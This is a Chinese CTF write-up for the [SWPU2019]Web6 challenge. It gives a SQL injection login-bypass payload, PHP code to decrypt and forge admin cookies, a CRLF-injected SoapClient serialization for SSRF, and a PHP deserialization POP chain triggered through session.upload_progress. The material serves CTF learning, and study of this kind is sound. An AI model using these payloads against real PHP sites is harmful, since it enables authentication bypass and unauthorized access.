---
title: "[SWPU2019]Web6"
date: 2020-04-18
tags: [CTF, WP,sql注入]
categories:
- [CTF, WP]
comments: false
---
# [SWPU2019]Web6

## SQL注入

### 方法一

验证机制是用户名和密码分开单独验证，并且没有检查空密码

<!-- more -->

**payload**

```
username=1' or '1'='1' group by passwd with rollup having passwd is NULL#&passwd=
```

查出来一个用户并且密码为空，正好可以和`passwd`没有传值是`NULL`相匹配

### 方法二

写脚本注入，参考

[SWPU2019-Web题解](https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web题解/)

## 伪造admin

登陆上后查看cookie，然后查看wsdl.php

调用`get_flag`提示

[![mark](https://blogjpg.yanmy.top/blog/20200418/fdGAYirSXJ7M.png?imageslim)](https://blogjpg.yanmy.top/blog/20200418/fdGAYirSXJ7M.png?imageslim)

[![mark](https://blogjpg.yanmy.top/blog/20200418/XJgGyei1gNVM.png?imageslim)](https://blogjpg.yanmy.top/blog/20200418/XJgGyei1gNVM.png?imageslim)

找到读取文件的方法，还有一个hint，于是依次读取index.php，encode.php，interface.php，se.php keyaaaaaaaasdfsaf.txt

[![mark](https://blogjpg.yanmy.top/blog/20200418/qgqd9WsM8elM.png?imageslim)](https://blogjpg.yanmy.top/blog/20200418/qgqd9WsM8elM.png?imageslim)

（不知为何Chrome的HackbarPOST不管用）

encode.php是对cookies的加密，`user=`后面的字符串为加密后的内容

写出解密脚本，然后伪造成admin，key为txt中的内容

```
function decrypt($data, $key)
{
	$key = md5($key);
	$x = 0;
	$data = base64_decode($data);
	$len = strlen($data);
	$l = strlen($key);
	$char = '';
	for ($i = 0; $i < $len; $i++)
	{
		if ($x == $l)
		{
			$x = 0;
		}
		$char .= substr($key, $x, 1);
		$x++;
	}
	$str = '';
	for ($i = 0; $i < $len; $i++)
	{
		if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1)))
		{
			$str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
		}
		else
		{
			$str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
		}
	}
	return $str;
}
function en_crypt($content,$key){
	$key    =    md5($key);
	$h      =    0;
	$length    =    strlen($content);
	$swpuctf      =    strlen($key);
	$varch   =    '';
	for ($j = 0; $j < $length; $j++)
	{
		if ($h == $swpuctf)
		{
			$h = 0;
		}
		$varch .= $key{$h};

		$h++;
	}
	$swpu  =  '';

	for ($j = 0; $j < $length; $j++)
	{
		$swpu .= chr(ord($content{$j}) + (ord($varch{$j})) % 256);
	}
	return base64_encode($swpu);
}
$key="flag{this_is_false_flag}";
$data="3J6Roahxag==";
echo decrypt($data,$key);
$admin="admin:1";
echo en_crypt($admin,$key);
```

改cookie后变成welcome admin，成功伪造成admin

## SSRF

因为要127.0.0.1,很容易联想到SSRF

在se.php中存在关键代码

```
ini_set('session.serialize_handler', 'php');
```

于是想到session反序列化,又要ssrf,想到利用Soap进行SSRF

> getflag方法总的来说就是构造文件上传写入session文件，然后利用session 反序列化，生成一个soapclient 对象,然后加上crlf设置cookie,进行越权 ssrf

### 上传SESSION

Soap反序列化写入SESSION

```
$target = 'http://127.0.0.1/interface.php';
$post_string = 'a=1&b=2';
$headers = array(
	'X-Forwarded-For: 127.0.0.1',
	'Cookie: user=xZmdm9NxaQ==',


);
$b = new SoapClient(null, array('location' => $target, 'user_agent' => 'wupco^^Content-Type: application/x-www-form-urlencoded^^' . join('^^', $headers), 'uri' => "aaab"));
$aaa = serialize($b);
$aaa = str_replace('^^', "\r\n", $aaa);
$aaa = str_replace('&', '&', $aaa);
echo $aaa;
//结果
O:10:"SoapClient":5:{s:3:"uri";s:4:"aaab";s:8:"location";s:30:"http://127.0.0.1/interface.php";s:15:"_stream_context";i:0;s:11:"_user_agent";s:109:"wupco
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Cookie: user=xZmdm9NxaQ==";s:13:"_soap_version";i:1;}
```

本地写一个html页面用于上传文件,利用`session.upload_progress`写入session

```
<html>
<body>
    <form action="http://905705f8-b6ff-431a-b953-c2c5ff0d70ed.node3.buuoj.cn/index.php" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="1" />
        <input type="file" name="file" />
        <input type="submit" />
    </form>
</body>
</html>
```

抓包修改

[![mark](https://blogjpg.yanmy.top/blog/20200418/oi8rEAsNnlTP.png?imageslim)](https://blogjpg.yanmy.top/blog/20200418/oi8rEAsNnlTP.png?imageslim)

### 触发SESSION反序列化

```
class aa {
	public $mod1;
	public $mod2;

	public function __call ($name, $param) {
		if ($this->{$name}) {
			$s1 = $this->{$name};
			$s1();
		}
	}

	public function __get ($ke) {
		return $this->mod2[$ke];
	}
}

class bb {
	public $mod1;
	public $mod2;

	public function __destruct () {
		$this->mod1->test2();
	}
}

class cc {
	public $mod1;
	public $mod2;
	public $mod3;

	public function __invoke () {
		$this->mod2 = $this->mod3 . $this->mod1;
	}
}

class dd {
	public $name;
	public $flag;
	public $b;

	public function getflag () {
		session_start();
		var_dump($_SESSION);
		$a = array(reset($_SESSION), $this->flag);
		echo call_user_func($this->b, $a);
	}
}

class ee {
	public $str1;
	public $str2;

	public function __toString () {
		$this->str1->{$this->str2}();
		return "1";
	}
}
$first = new bb();
$second = new aa();
$third = new cc();
$four = new ee();
$first->mod1 = $second;
$third->mod1 = $four;
$f = new dd();
$f->flag = 'Get_flag';
$f->b = 'call_user_func';
$four->str1 = $f;
$four->str2 = "getflag";
$second->mod2['test2'] = $third;
//var_dump($first);
echo serialize($first);
```

目的是触发get_flag方法

```
bb->__destruct()`===>`aa->__call()`===>`cc->__invoke()`===>`ee->__toString()`===>`dd->getflag()
```

pop链可以用反向分析的方法得到。

触发session反序列化得到Soap对象爬取到的flag,然后输出

发送给se.php即可得到flag

[![mark](https://blogjpg.yanmy.top/blog/20200418/gMTEYpm95l3I.png?imageslim)](https://blogjpg.yanmy.top/blog/20200418/gMTEYpm95l3I.png?imageslim)

## 学习一下session.upload_progress

php>5.4时,php.ini有如下默认配置

```
session.upload_progress.enabled = on
session.upload_progress.cleanup = on
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
session.upload_progress.freq = "1%"
session.upload_progress.min_freq = "1"
```

- `enabled=on`表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；
- `cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；
  - `cleanup=on`时考虑条件竞争进行利用
- `name`当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；
- `prefix+name`将表示为session中的键名

## Reference

[SWPU2019-Web题解](https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web题解/)

[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)

[第十届SWPUCTFwriteup](https://www.anquanke.com/post/id/194640#h3-6)

[PHP中SESSION反序列化机制](https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral)